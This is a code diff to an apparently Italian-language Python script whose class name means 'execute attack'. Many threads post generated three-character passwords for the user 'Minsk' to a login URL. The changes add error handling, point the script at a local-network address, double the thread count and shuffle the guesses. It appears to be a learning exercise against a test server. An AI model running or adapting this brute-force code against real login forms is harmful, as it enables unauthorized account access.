@@ -19,7 +19,10 @@ class EseguiAttacco(threading.Thread):
 
             console.info(f"Thread numero: {self.num_thread} dice: password provata = {combinazione}")
 
-            risultato = requests.post(url, data={"username":"Minsk", "password":combinazione}).text
+            try:
+                risultato = requests.post(url, data={"username":"Minsk", "password":combinazione}).text
+            except:
+                console.error(f"Thread numero: {self.num_thread} dice: errore richiesta")
             
             #print(risultato)
             # capire il risultato
@@ -31,8 +34,8 @@ class EseguiAttacco(threading.Thread):
                 break
         
 
-url = "http://0.0.0.0:5000/"
-numero_thread = 40
+url = "http://192.168.0.128:5000/"
+numero_thread = 80
 luogo_dati = "creati"
 
 dir_path = str(Path(__file__).parent.resolve())+"/"
@@ -62,6 +65,8 @@ def main():
                     count += 1
                     
         pd.DataFrame(arrayCombinazioni, columns=["combinazioni"]).to_csv(f"{dir_path}combinazioni.csv")
+
+    np.random.shuffle(arrayCombinazioni)
 
 
     num_elementi_per_lista = int((len(caratteri)**3) / numero_thread)
